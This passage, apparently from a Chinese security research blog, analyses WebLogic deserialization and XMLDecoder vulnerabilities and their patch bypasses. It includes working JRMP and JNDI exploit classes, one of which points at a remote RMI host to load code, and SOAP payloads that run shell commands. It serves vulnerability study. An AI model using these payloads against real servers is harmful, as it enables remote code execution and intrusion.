<p>当动态代理的代理类被反序列化时会在<code>readObject</code>之前先调用<code>resolveProxyClass</code>，我们从图中看到黑名单中只有<code>java.rmi.registry.Registry</code>。可见weblogic官方只是指哪修哪，并没有从根源上解决问题。</p>
<p>来看一下CVE-2017-3248的部分调用链：</p>
<p><img src="https://mdpicture.oss-cn-beijing.aliyuncs.com/20191126152848.png"></p>
<p>第一个readObject是应用反序列化JRMPClient，第二个是利用成功之后，client访问恶意server，读取server中的恶意数据进行反序列化。可以注意到反序列化调用的并不是<code>java.rmi.server.RemoteObjectInvocationHandler</code>的readObject，而是<code>RemoteObject</code>的。这是因为<code>RemoteObjectInvocationHandler</code>本身没有实现readObject，所以使用了父类方法。</p>
<p>那么目前绕过思路有这么几个：</p>
<ol>
<li>既然是反序列化代理类才会调用<code>resolveProxyClass</code>，那么可以找不使用动态代理的gadget。最后调用到<code>java.rmi.server.RemoteObject#readObject</code>或者<code>sum.rmi.server.UnicastRef#readExternal</code>即可。</li>
<li>使用<code>java.rmi.server.RemoteObjectInvocationHandler</code>之外的中介类，只要这个类继承自<code>java.rmi.server.RemoteObject</code>即可。</li>
<li>使用<code>java.rmi.registry.Registry</code>之外的委托类。</li>
</ol>
<h4 id="CVE-2018-2628"><a href="#CVE-2018-2628" class="headerlink" title="CVE-2018-2628"></a>CVE-2018-2628</h4><p>按照上面的介绍思路，出现了CVE-2018-2628：</p>
<p>绕过一：直接反序列化UnicastRef对象，调用<code>sum.rmi.server.UnicastRef#readExternal</code>。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JRMPClient2</span> <span class="keyword">extends</span> <span class="title class_">PayloadRunner</span> <span class="keyword">implements</span> <span class="title class_">ObjectPayload</span>&lt;Object&gt; &#123;</span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getObject</span> <span class="params">( <span class="keyword">final</span> String command )</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">				<span class="comment">//与JRMPClient相同</span></span><br><span class="line">        <span class="type">ObjID</span> <span class="variable">id</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjID</span>(<span class="keyword">new</span> <span class="title class_">Random</span>().nextInt()); <span class="comment">// RMI registry</span></span><br><span class="line">        <span class="type">TCPEndpoint</span> <span class="variable">te</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TCPEndpoint</span>(host, port);</span><br><span class="line">        <span class="type">UnicastRef</span> <span class="variable">ref</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UnicastRef</span>(<span class="keyword">new</span> <span class="title class_">LiveRef</span>(id, te, <span class="literal">false</span>));</span><br><span class="line">				<span class="comment">//使用动态代理的部分直接删除</span></span><br><span class="line">        <span class="keyword">return</span> ref;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span> <span class="params">( <span class="keyword">final</span> String[] args )</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Thread.currentThread().setContextClassLoader(JRMPClient2.class.getClassLoader());</span><br><span class="line">        PayloadRunner.run(JRMPClient2.class, args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>绕过二：用Activator代替Registry，它们都继承自<code>java.rmi.Remote</code>：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JRMPClient3</span> <span class="keyword">extends</span> <span class="title class_">PayloadRunner</span> <span class="keyword">implements</span> <span class="title class_">ObjectPayload</span>&lt;Activator&gt; &#123;</span><br><span class="line">    <span class="keyword">public</span> Activator <span class="title function_">getObject</span> <span class="params">( <span class="keyword">final</span> String command )</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">				<span class="comment">//与JRMPClient相同</span></span><br><span class="line">        <span class="type">ObjID</span> <span class="variable">id</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjID</span>(<span class="keyword">new</span> <span class="title class_">Random</span>().nextInt()); <span class="comment">// RMI registry</span></span><br><span class="line">        <span class="type">TCPEndpoint</span> <span class="variable">te</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TCPEndpoint</span>(host, port);</span><br><span class="line">        <span class="type">UnicastRef</span> <span class="variable">ref</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UnicastRef</span>(<span class="keyword">new</span> <span class="title class_">LiveRef</span>(id, te, <span class="literal">false</span>));</span><br><span class="line">        <span class="type">RemoteObjectInvocationHandler</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RemoteObjectInvocationHandler</span>(ref);</span><br><span class="line">        <span class="type">Activator</span> <span class="variable">proxy</span> <span class="operator">=</span> (Activator) Proxy.newProxyInstance(JRMPClient3.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;</span><br><span class="line">            Activator.class</span><br><span class="line">        &#125;, obj);</span><br><span class="line">        <span class="keyword">return</span> proxy;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span> <span class="params">( <span class="keyword">final</span> String[] args )</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Thread.currentThread().setContextClassLoader(JRMPClient3.class.getClassLoader());</span><br><span class="line">        PayloadRunner.run(JRMPClient3.class, args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="CVE-2018-2893"><a href="#CVE-2018-2893" class="headerlink" title="CVE-2018-2893"></a>CVE-2018-2893</h4><p>这次绕过是前面两个漏洞的结合，由于weblogic一直没有处理<code>streamMessageImpl</code>，导致CVE-2016-0638 + CVE-2018-2628 &#x3D; CVE-2018-2893。</p>
<p><a target="_blank" rel="noopener" href="https://github.com/pyn3rd/CVE-2018-2893">https://github.com/pyn3rd/CVE-2018-2893</a></p>
<h4 id="CVE-2018-3245"><a href="#CVE-2018-3245" class="headerlink" title="CVE-2018-3245"></a>CVE-2018-3245</h4><p>同样是jrmp相关的绕过，这次使用<code>ReferenceWrapper_Stub</code>来代替<code>RemoteObjectInvocationHandler</code>：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JRMPClient4</span> <span class="keyword">extends</span> <span class="title class_">PayloadRunner</span> <span class="keyword">implements</span> <span class="title class_">ObjectPayload</span>&lt;Object&gt; &#123;</span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getObject</span> <span class="params">( <span class="keyword">final</span> String command )</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">				<span class="comment">//与JRMPClient相同</span></span><br><span class="line">        <span class="type">ObjID</span> <span class="variable">id</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjID</span>(<span class="keyword">new</span> <span class="title class_">Random</span>().nextInt()); <span class="comment">// RMI registry</span></span><br><span class="line">        <span class="type">TCPEndpoint</span> <span class="variable">te</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TCPEndpoint</span>(host, port);</span><br><span class="line">        <span class="type">UnicastRef</span> <span class="variable">ref</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UnicastRef</span>(<span class="keyword">new</span> <span class="title class_">LiveRef</span>(id, te, <span class="literal">false</span>));</span><br><span class="line">      	<span class="comment">//没有过滤的情况下，测试直接返回obj也可以</span></span><br><span class="line">      	<span class="comment">//RemoteObjectInvocationHandler obj = new RemoteObjectInvocationHandler(ref);</span></span><br><span class="line">        <span class="type">ReferenceWrapper_Stub</span> <span class="variable">wrapperStub</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReferenceWrapper_Stub</span>(ref);</span><br><span class="line">        <span class="keyword">return</span> wrapperStub;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span> <span class="params">( <span class="keyword">final</span> String[] args )</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Thread.currentThread().setContextClassLoader(JRMPClient3.class.getClassLoader());</span><br><span class="line">        PayloadRunner.run(JRMPClient3.class, args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="CVE-2018-3191"><a href="#CVE-2018-3191" class="headerlink" title="CVE-2018-3191"></a>CVE-2018-3191</h4><p>这个漏洞利用的是jndi，与上面的漏洞不同的，这个漏洞是weblogic自身的gadget，没有使用第三方包（如CommonsCollections）中的gadget，所以危害相对来说更大。</p>
<p>漏洞的入口在<code>com.bea.core.repackaged.springframework.spring_1.2.0.0_2-5-3.jar!/com/bea/core/repackaged/springframework/transaction/jta/JtaTransactionManager.class</code></p>
<p><img src="https://mdpicture.oss-cn-beijing.aliyuncs.com/20191127143620.png"></p>
<p>跟进<code>initUserTransactionAndTransactionManager</code>：</p>
<p><img src="https://mdpicture.oss-cn-beijing.aliyuncs.com/20191127143810.png"></p>
<p>继续跟进，直到<code>com.bea.core.repackaged.springframework.spring_1.2.0.0_2-5-3.jar!/com/bea/core/repackaged/springframework/jndi/JndiTemplate.class</code>：</p>
<p><img src="https://mdpicture.oss-cn-beijing.aliyuncs.com/20191127144011.png"></p>
<p>所以我们只要构造<code>userTransactionName</code>属性为恶意jndi地址即可。</p>
<p>这里exp构造起来也很简单：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.seaii.unser.exp;</span><br><span class="line"><span class="keyword">import</span> com.bea.core.repackaged.springframework.transaction.jta.JtaTransactionManager;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JNDI1</span> <span class="keyword">extends</span> <span class="title class_">Exp</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">jndiAddress</span> <span class="operator">=</span> <span class="string">&quot;rmi://10.254.254.254:1099/Exploit&quot;</span>;</span><br><span class="line">        <span class="type">JtaTransactionManager</span> <span class="variable">jtaTransactionManager</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JtaTransactionManager</span>();</span><br><span class="line">        jtaTransactionManager.setUserTransactionName(jndiAddress);</span><br><span class="line"></span><br><span class="line">        ser(jtaTransactionManager);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里不知道为什么用marshalsec起一个rmi server不好使，需要起一个JRMPServer。</p>
<h3 id="XMLDecoder"><a href="#XMLDecoder" class="headerlink" title="XMLDecoder"></a>XMLDecoder</h3><p>在分析XMLDecoder相关的漏洞时，我们将重点放在xml解析的过程，weblogic的路由分发等只做简要介绍。</p>
<p><img src="https://mdpicture.oss-cn-beijing.aliyuncs.com/20191201171309.png"></p>
<p>这部分调用栈就是weblogic路由分发的过程，从<code>server/lib/weblogic.jar!/weblogic/wsee/jaxws/workcontext/WorkContextTube.class</code>的<code>readHeaderOld</code>方法开始解析xml：</p>
<p><img src="https://mdpicture.oss-cn-beijing.aliyuncs.com/20191201174124.png"></p>
<p><img src="https://mdpicture.oss-cn-beijing.aliyuncs.com/20191201173606.png"></p>
<p><code>server/lib/weblogic.jar!/weblogic/wsee/workarea/WorkContextXmlInputAdapter.class</code></p>
<p><img src="https://mdpicture.oss-cn-beijing.aliyuncs.com/20191201175337.png"></p>
<p>上述部分是weblogic对于传入的xml的处理，后面才正式交给jdk中的XMLDecoder进行处理。关于这部分在<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=MzU5NDgxODU1MQ==&mid=2247485058&idx=1&sn=d22b310acf703a32d938a7087c8e8704">WebLogic安全研究报告</a>这篇文章中的<strong>XMLDecoder反序列化漏洞</strong>部分已经有了非常非常详尽的描述，再次表达一下对贡献这篇文章的两位师傅的膜拜。</p>
<p>解析的核心在于XMLDecoder对标签的匹配，通过反射调用相应的方法。</p>
<p><code>1.6.0.jdk/Contents/Classes/classes.jar!/com/sun/beans/ObjectHandler.class</code></p>
<p><img src="https://mdpicture.oss-cn-beijing.aliyuncs.com/20191201180506.png"></p>
<p>在jdk1.7专门为标签设置了对应的handler：</p>
<p><code>jdk1.7.0_21.jdk/Contents/Home/jre/lib/rt.jar!/com/sun/beans/decoder/DocumentHandler.class</code></p>
<p><img src="https://mdpicture.oss-cn-beijing.aliyuncs.com/20191201180859.png"></p>
<p>配合payload看可能更容易理解：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">soapenv:Envelope</span> <span class="attr">xmlns:soapenv</span>=<span class="string">&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">soapenv:Header</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">work:WorkContext</span> <span class="attr">xmlns:work</span>=<span class="string">&quot;http://bea.com/2004/06/soap/workarea/&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">java</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">object</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">array</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.String&quot;</span> <span class="attr">length</span>=<span class="string">&quot;3&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">&quot;0&quot;</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">string</span>&gt;</span>/bin/bash<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">&quot;1&quot;</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">string</span>&gt;</span>-c<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">&quot;2&quot;</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">string</span>&gt;</span>whoami<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">array</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">&quot;start&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">object</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">java</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">work:WorkContext</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">soapenv:Header</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">soapenv:Body</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">soapenv:Envelope</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="CVE-2017-3506"><a href="#CVE-2017-3506" class="headerlink" title="CVE-2017-3506"></a>CVE-2017-3506</h4><p>最一开始的weblogic就像白纸一样，一点过滤也没有，payload就在上面，但是没有回显。</p>
<p>重点来看修复：</p>
<p><img src="https://mdpicture.oss-cn-beijing.aliyuncs.com/20191201182223.png"></p>
<p>补丁再次白嫖，来自<a target="_blank" rel="noopener" href="http://xxlegend.com/2017/12/23/Weblogic%20XMLDecoder%20RCE%E5%88%86%E6%9E%90/">Weblogic XMLDecoder RCE分析</a>。</p>
<h4 id="CVE-2017-10271-x2F-CVE-2017-10352"><a href="#CVE-2017-10271-x2F-CVE-2017-10352" class="headerlink" title="CVE-2017-10271&#x2F;CVE-2017-10352"></a>CVE-2017-10271&#x2F;CVE-2017-10352</h4><p>只过滤object显然是不行的，这两个漏洞都是对上述补丁的绕过。我们试着分析绕过原理：</p>
<p>绕过方式一：将object改为void，以jdk1.7为例来看</p>
<p><code>jdk1.7.0_21.jdk/Contents/Home/jre/lib/rt.jar!/com/sun/beans/decoder/VoidElementHandler.class</code></p>
<p><img src="https://mdpicture.oss-cn-beijing.aliyuncs.com/20191201185457.png"></p>
<p>VoidElementHandler继承自ObjectElementHandler，且没有任何实现，所以最后还是走ObjectElementHandler的逻辑。</p>
<p>绕过方式二：使用new：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">java</span> <span class="attr">class</span>=<span class="string">&quot;java.beans.XMLDecoder&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">new</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>&gt;</span></span><br><span class="line">  	<span class="tag">&lt;<span class="name">string</span>&gt;</span>whoami<span class="tag">&lt;/<span class="name">string</span>&gt;</span><span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">&quot;start&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">new</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">java</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>这种方式jdk1.6不支持，无法生效。</p>
<p>在这次绕过之后，weblogic加强了过滤：</p>
<p><img src="https://mdpicture.oss-cn-beijing.aliyuncs.com/20191201191451.png"></p>
<p>补丁再再次白嫖，同样来自<a target="_blank" rel="noopener" href="http://xxlegend.com/2017/12/23/Weblogic%20XMLDecoder%20RCE%E5%88%86%E6%9E%90/">Weblogic XMLDecoder RCE分析</a>。这次将object、void、new等全部过滤，已经无法创建java实例。但是如果xmldecode增加新的解析规则，而黑名单不同步更新的话，不排除再次出现绕过的可能。</p>
<h4 id="CVE-2019-2725"><a href="#CVE-2019-2725" class="headerlink" title="CVE-2019-2725"></a>CVE-2019-2725</h4><p>随着过滤越来越严格，漏洞利用也越来越困难。</p>
<p>首先看漏洞的入口，首先我们发送一个最简单的soap请求：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">soapenv:Envelope</span> <span class="attr">xmlns:soapenv</span>=<span class="string">&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">soapenv:Header</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">soapenv:Header</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">soapenv:Body</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">soapenv:Envelope</span>&gt;</span> </span><br></pre></td></tr></table></figure>

<p>请求会依次经过21handler来处理：</p>
<p><img src="https://mdpicture.oss-cn-beijing.aliyuncs.com/20191208133422.png"></p>
<p>但是当请求有<code>weblogic.jar!/weblogic/wsee/async/AsyncResponseHandler.class</code>来处理时，程序终止了，所以我们跟进看一下：</p>
<p><img src="https://mdpicture.oss-cn-beijing.aliyuncs.com/20191208134735.png"></p>
<p>可以看到xml中有一个属性没有取到导致程序终止，所以我们要在payload中增加这个属性：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">soapenv:Envelope</span> <span class="attr">xmlns:soapenv</span>=<span class="string">&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;</span></span></span><br><span class="line"><span class="tag"><span class="attr">xmlns:ads</span>=<span class="string">&quot;http://www.w3.org/2005/08/addressing&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">soapenv:Header</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ads:Action</span>&gt;</span>demo<span class="tag">&lt;/<span class="name">ads:Action</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ads:RelatesTo</span>&gt;</span>test<span class="tag">&lt;/<span class="name">ads:RelatesTo</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">soapenv:Header</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">soapenv:Body</span>&gt;</span><span class="tag">&lt;/<span class="name">soapenv:Body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">soapenv:Envelope</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>继续调试，发现在<code>weblogic.jar!/weblogic/wsee/ws/dispatch/server/OperationLookupHandler.class</code>程序又终止了：</p>
<p><img src="https://mdpicture.oss-cn-beijing.aliyuncs.com/20191208140546.png"></p>
<p><code>weblogic.jar!/weblogic/wsee/ws/dispatch/server/OperationLookupHandler.class</code></p>
<p><img src="https://mdpicture.oss-cn-beijing.aliyuncs.com/20191208141130.png"></p>
<p>所以我们要再次增加属性以让程序继续运行：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">soapenv:Envelope</span> <span class="attr">xmlns:soapenv</span>=<span class="string">&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;</span></span></span><br><span class="line"><span class="tag"><span class="attr">xmlns:ads</span>=<span class="string">&quot;http://www.w3.org/2005/08/addressing&quot;</span></span></span><br><span class="line"><span class="tag"><span class="attr">xmlns:asy</span>=<span class="string">&quot;http://www.bea.com/async/AsyncResponseService&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">soapenv:Header</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ads:Action</span>&gt;</span>demo<span class="tag">&lt;/<span class="name">ads:Action</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ads:RelatesTo</span>&gt;</span>test<span class="tag">&lt;/<span class="name">ads:RelatesTo</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">work:WorkContext</span> <span class="attr">xmlns:work</span>=<span class="string">&quot;http://bea.com/2004/06/soap/workarea/&quot;</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;/<span class="name">work:WorkContext</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">soapenv:Header</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">soapenv:Body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">asy:onAsyncDelivery</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">soapenv:Body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">soapenv:Envelope</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>之后请求交给<code>weblogic.jar!/weblogic/wsee/workarea/WorkAreaServerHandler.class</code>处理，开始读取<code>work:WorkContext</code>标签中的数据（payload），进行反序列化：</p>
<p><img src="https://mdpicture.oss-cn-beijing.aliyuncs.com/20191208141525.png"></p>
<p>既然漏洞的入口找到了，下一步就是利用，但是回看上面的补丁，发现可用的标签所剩无几：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">class标签</span><br><span class="line">array标签，但是class属性的值只能是byte</span><br><span class="line">string标签</span><br></pre></td></tr></table></figure>

<p>为了满足这些条件并绕过补丁，达到利用漏洞的目的，我们需要找到这样一个类：</p>
<p>构造函数接受参数，且参数类型为byte[]或者string，构造函数中有敏感操作（反序列化、rce、文件操作、访问rmi等等），下面记录已有的可利用类：</p>
<h5 id="UnitOfWorkChangeSet"><a href="#UnitOfWorkChangeSet" class="headerlink" title="UnitOfWorkChangeSet"></a>UnitOfWorkChangeSet</h5><p>这个类是漏洞曝出时最先出现的利用类：</p>
<p><code>com.oracle.toplink_1.1.0.0_11-1-1-6-0.jar!/oracle/toplink/internal/sessions/UnitOfWorkChangeSet.class</code></p>
<p><img src="https://mdpicture.oss-cn-beijing.aliyuncs.com/20191208142736.png"></p>
<p>可以看到这个类完全符合我们上面说的条件，构造函数接受byte[]类型的参数，并将参数再次反序列化。</p>
<p>但是这个类又很大的局限性，首先这只是一个反序列化的入口，需要寻找可以利用的gadget，此时weblogic的commons-collections已经升级，可以考虑使用<strong>jdk7u21</strong>或者前提到的<strong>CVE-2018-3191</strong>也就是weblogic程序本身的一个gadget。</p>
<p>其实是这个类只存在于weblogic10.3.6，所以利用范围被限制的很死。</p>
<p>同时在构造payload时有一个很大的坑点，好多师傅都提到过，这里记录一下：</p>
<p><img src="https://mdpicture.oss-cn-beijing.aliyuncs.com/20191208143747.png"></p>
<p>图片内容来自<a target="_blank" rel="noopener" href="https://paper.seebug.org/909/">WebLogic RCE(CVE-2019-2725)漏洞之旅</a>。</p>
<h5 id="com-sun-rowset-JdbcRowSetImpl"><a href="#com-sun-rowset-JdbcRowSetImpl" class="headerlink" title="com.sun.rowset.JdbcRowSetImpl"></a>com.sun.rowset.JdbcRowSetImpl</h5><p>可以通过property属性重写payload，可以无视weblogic版本，但是由于xmldecoder解析方式的不同，不适用于jdk1.6。</p>
<h5 id="org-slf4j-ext-EventData"><a href="#org-slf4j-ext-EventData" class="headerlink" title="org.slf4j.ext.EventData"></a>org.slf4j.ext.EventData</h5><p><img src="https://mdpicture.oss-cn-beijing.aliyuncs.com/20191208144720.png"></p>
<p>同样符合漏洞利用的条件，可以无视jdk版本，但是只能在12.1.3版本中利用。</p>
<p>#####FileSystemXmlApplicationContext</p>
<p>最后是廖师傅的文章<a target="_blank" rel="noopener" href="http://xxlegend.com/2019/04/30/CVE-2019-2725%E5%88%86%E6%9E%90/">CVE-2019-2725 分析</a>中提到的<code>com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext</code>，可以无视weblogic和jdk的版本限制。其实这个思路在上面<code>cve-2018-3245</code>中就有利用，虽然weblogic将spring相关的类加入了黑名单，但是weblogic自己打包了一份spring，包名是<code>com.bea.core.repackaged.springframework.xxxx</code>，这样的包名让关于spring的黑名单形同虚设。</p>
<p>这个利用方式用的是<code>com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext</code>，如果了解spring框架运行机制就会知道：spring会读取xml配置文件，然后通过反射来实例化xml中声明的类。如果我们让程序读取事先构造好的恶意配置文件，就可以实例化任意类。</p>
<p>payload如下：</p>
